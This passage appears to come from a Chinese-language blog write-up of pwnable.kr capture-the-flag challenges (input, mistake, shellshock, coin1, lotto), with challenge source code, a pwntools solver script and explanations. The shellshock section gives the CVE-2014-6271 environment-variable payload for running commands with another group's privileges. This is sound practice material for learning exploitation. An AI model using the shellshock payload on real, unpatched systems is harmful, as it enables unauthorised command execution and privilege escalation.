class="line">    sleep(<span class="number">2</span>);       <span class="comment">//等待服务开启</span></span><br><span class="line">    <span class="type">int</span> cfd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">4</span>] = <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>;    <span class="comment">//payload</span></span><br><span class="line">    cfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);    <span class="comment">//申请客户端套接字</span></span><br><span class="line">    <span class="keyword">if</span> (cfd == <span class="number">-1</span>)&#123;    <span class="comment">//申请失败</span></span><br><span class="line">        perror(<span class="string">&quot;socket request error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置服务端的信息</span></span><br><span class="line">    server.sin_family = AF_INET;</span><br><span class="line">    server.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    server.sin_port = htons(PORT);</span><br><span class="line">    <span class="keyword">if</span> (connect(cfd, (<span class="keyword">struct</span> sockaddr*)&amp;server, <span class="keyword">sizeof</span>(server)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;connect failed\n&quot;</span>);           <span class="comment">//连接被拒绝</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//连接成功，发送数据，发送后结束通信</span></span><br><span class="line">    send(cfd, buf, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    close(cfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>你可以把程序代码用scp发到pwnable.kr的/tmp目录下，然后将flag用ln链接过来编译后运行。</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222140558525.png" style="zoom:80%;" /></p>
<p>我这里没有链接flag，所以最后没有东西，但是可以看到所有步骤都通过了。</p>
<h2 id="leg">leg</h2>
<p>arm暂时没学习，先空着...</p>
<h2 id="mistake">mistake</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">We all make mistakes, let&#x27;s move on.</span><br><span class="line">(don&#x27;t take this too seriously, no fancy hacking skill is required at all)</span><br><span class="line"></span><br><span class="line">This task is based on real event</span><br><span class="line">Thanks to dhmonkey</span><br><span class="line"></span><br><span class="line">hint : operator priority</span><br><span class="line"></span><br><span class="line">ssh mistake@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">xor</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span> len)</span>&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">		s[i] ^= XORKEY;		<span class="comment">//逐位和1进行异或</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> fd;</span><br><span class="line">	<span class="keyword">if</span>(fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;	<span class="comment">//0400即r-- --- --- 只读模式</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">	sleep(time(<span class="number">0</span>)%<span class="number">20</span>);	<span class="comment">//睡眠1~20s</span></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">	<span class="type">int</span> len;</span><br><span class="line">	<span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;		<span class="comment">//从password文件中读取10个字节到pw_buf</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">		close(fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);		<span class="comment">//输入10位字符串</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// xor your input</span></span><br><span class="line">	xor(pw_buf2, <span class="number">10</span>);		<span class="comment">//将你的输入逐位与1异或</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;		<span class="comment">//如果相等即可通过</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然而那个password文件是读不了的(root才可读)，所以这10位数字你不能反向异或获得，而且也提示不能爆破，但是hint指出与操作符等级有关。</p>
<p>C语言中大于小于号的优先级是大于等号的，那么对于这一句：</p>
<p><code>if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)</code>就可以看出先进行了open函数，在与0比较之后才赋值给了fd变量。那就很有意思了，open函数打开的文件描述符当然是从3开始的，怎么都不会小于0，所以这个比较为0，即标准输入了。之后：
<code>if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123;</code>，可以看到这里的pw_buf就是可控的了，是从标准输入输入了10个字节到pw_buf，所以你输入的pw_buf2在异或后只要等于pw_buf就可以了，比如<code>pw_buf=0000000000</code>，那你二次输入的<code>pw_buf2</code>就应该为<code>1111111111</code>，这样与1异或后就相等了：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222142325376.png" alt="image-20200222142325376" style="zoom:80%;" /></p>
<h2 id="shellshock">shellshock</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mommy, there was a shocking news about bash.</span><br><span class="line">I bet you already know, but lets just make it sure :)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh shellshock@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	setresuid(getegid(), getegid(), getegid());</span><br><span class="line">	setresgid(getegid(), getegid(), getegid());</span><br><span class="line">	system(<span class="string">&quot;/home/shellshock/bash -c &#x27;echo shock_me&#x27;&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看一下函数描述：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setresuid</span><span class="params">(<span class="type">uid_t</span> ruid, <span class="type">uid_t</span> euid, <span class="type">uid_t</span> suid)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">setresgid</span><span class="params">(<span class="type">gid_t</span> rgid, <span class="type">gid_t</span> egid, <span class="type">gid_t</span> sgid)</span>;</span><br><span class="line">  setresuid() sets the real user ID, the effective user ID, and the saved <span class="built_in">set</span>-user-ID of the calling process.</span><br><span class="line">  Completely analogously, setresgid() sets the real GID, effective GID, and saved <span class="built_in">set</span>-group-ID of the calling <span class="title function_">process</span> <span class="params">(and always modifies the filesystem GID to be the same as  the effective GID)</span>, with the same restrictions <span class="keyword">for</span> unprivileged processes.</span><br></pre></td></tr></table></figure>
<p>这道题其实是一个CVE，破壳漏洞(shellshock)CVE-2014-6271，<a
target="_blank" rel="noopener" href="https://blog.csdn.net/tinyletero/article/details/40261593">漏洞简介</a>：</p>
<blockquote>
<p>GNU Bash
4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行Shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用Bash
Shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在Shell被调用后会被立即执行。破壳漏洞的严重性被定义为10级（最高），OpenSSL“心脏出血”漏洞为5级</p>
</blockquote>
<p>可以实验一下：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222143958294.png" style="zoom:80%;" /></p>
<p>没有问题，后面的字符串会被执行，那么看一下所有文件的权限：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellshock@pwnable:~$ <span class="built_in">ls</span> -l</span><br><span class="line">total 960</span><br><span class="line">-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash</span><br><span class="line">-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag</span><br><span class="line">-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock</span><br><span class="line">-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c</span><br></pre></td></tr></table></figure>
<p>我们当前身份是shellsock，要读取flag，需要shellsock_pwn的身份，根据payload：<code>env x='() &#123; :;&#125;; 命令A' ./子进程</code>，命令A会被以子进程的身份执行，那么可以这样构造：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222144157410.png" style="zoom: 80%;" /></p>
<h2 id="coin1">coin1</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mommy, I wanna play a game!</span><br><span class="line">(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9007</span><br></pre></td></tr></table></figure>
<p>这道题没啥说的了就是个编程题，使用的是二分法：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222144850304.png" style="zoom:80%;" /></p>
<p>大意就是，开始会给你N值和C值，其中N代表硬币的总数，C代表你尝试的机会，你可以每次指定几个下标的硬币(从0开始)，服务端会返回给你这几个硬币的总重，这N个硬币中有1个是假的，真硬币重量为10，假的重量为9。如果你能猜对100轮，就给你flag。</p>
<p>假如说吧，10个硬币一个假的，你可先称前5个，就可以确定假的在前5个还是后5个了，即使用二分法可以很快找到假硬币，这里直接放我写的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_weight</span>(<span class="params">start, end, r</span>):</span><br><span class="line">    send_str = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        send_str = send_str + <span class="built_in">str</span>(i) + <span class="string">&quot; &quot;</span>          <span class="comment">#每一个数字之间需要用空格来分开</span></span><br><span class="line">    r.sendline(send_str)</span><br><span class="line">    result = r.recvline()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_coin</span>(<span class="params">num, chance, r</span>):</span><br><span class="line">    <span class="comment">#获得起始下标和尾标</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    end = num - <span class="number">1</span></span><br><span class="line">    flag = end          <span class="comment">#记录上一轮的end的位置，用于恢复上一轮的end</span></span><br><span class="line">    end = (start + end)/<span class="number">2</span></span><br><span class="line">    weight = <span class="number">0</span>      <span class="comment">#获取总重量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, chance+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[*]Round &#x27;</span>, i</span><br><span class="line">        <span class="keyword">if</span> (start == end):      <span class="comment">#已经搜索到了答案</span></span><br><span class="line">            weight = get_weight(start, end, r)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            weight = get_weight(start, end, r)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;[*]Start:%d, End:%d, Weight:%d\n&#x27;</span> % (start, end, weight)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> weight % <span class="number">10</span> != <span class="number">0</span>:</span><br><span class="line">                flag = end      <span class="comment">#记录当前的end</span></span><br><span class="line">                end = (start + end)/<span class="number">2</span>            <span class="comment">#在当前范围内，新end向前推进</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                start = end         <span class="comment">#不在当前的范围内，向后推进</span></span><br><span class="line">                end = (flag + end)/<span class="number">2</span>      </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*]My answer: %d&#x27;</span> % (start)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(start))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+]server: &#x27;</span>, r.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    r = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9007</span>)      <span class="comment">#连接</span></span><br><span class="line">    <span class="built_in">print</span> r.recv()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;#&#x27;</span> * <span class="number">18</span> + <span class="string">&quot; &quot;</span>,  i, <span class="string">&quot; &quot;</span> + <span class="string">&#x27;#&#x27;</span> * <span class="number">18</span></span><br><span class="line">        recvword = r.recvline()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+]server: &quot;</span>,recvword        <span class="comment">#获取数据格式：N=962 C=10</span></span><br><span class="line"></span><br><span class="line">        p = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d+&#x27;</span>)      <span class="comment">#正则匹配</span></span><br><span class="line">        data = p.findall(recvword)</span><br><span class="line"></span><br><span class="line">        num = <span class="built_in">int</span>(data[<span class="number">0</span>])      <span class="comment">#硬币总数N</span></span><br><span class="line">        chance = <span class="built_in">int</span>(data[<span class="number">1</span>])   <span class="comment">#可以尝试的总次数C</span></span><br><span class="line">        choose_coin(num,chance,r)</span><br><span class="line">    <span class="built_in">print</span> r.recvline()</span><br><span class="line">    <span class="built_in">print</span> r.recvline()</span><br></pre></td></tr></table></figure>
<p>可能不一定能直接对，因为有这种比较狗的组合哈哈哈(1/2几率都错了，脸黑：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222150020705.png" style="zoom:80%;" /></p>
<p>正确100次就没问题了，建议scp到服务器上运行，不然很慢会导致断连：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222150239525.png" style="zoom:80%;" /></p>
<p>ps：这道题算法细节问题感谢<a
target="_blank" rel="noopener" href="https://blank-vax.github.io/">bl@nk师傅</a>的指导</p>
<h2 id="blackjack">blackjack</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Hey! check out this C implementation of blackjack game!</span><br><span class="line">I found it online</span><br><span class="line">* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</span><br><span class="line"></span><br><span class="line">I like to give my flags to millionares.</span><br><span class="line">how much money you got?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9009</span><br></pre></td></tr></table></figure>
<p>这道题就是21点，具体还是编程题，这里先空着。</p>
<h2 id="lotto">lotto</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mommy! I made a lotto program for my homework.</span><br><span class="line">do you want to play?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh lotto@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">play</span><span class="params">()</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Submit your 6 lotto bytes : &quot;</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> r;</span><br><span class="line">	r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Lotto Start!\n&quot;</span>);</span><br><span class="line">	<span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// generate lotto numbers</span></span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> lotto[<span class="number">6</span>];</span><br><span class="line">	<span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">		lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;		<span class="comment">// 1 ~ 45</span></span><br><span class="line">	&#125;</span><br><span class="line">	close(fd);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// calculate lotto score</span></span><br><span class="line">	<span class="type">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">				match++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// win!</span></span><br><span class="line">	<span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;bad luck...\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">help</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;- nLotto Rule -\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;your goal is to match lotto numbers as many as you can\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;if you win lottery for *1st place*, you will get reward\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;for more details, follow the link below\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// menu</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> menu;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;- Select Menu -\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;1. Play Lotto\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;2. Help\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span>(menu)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				play();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				help();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;invalid menu\n&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		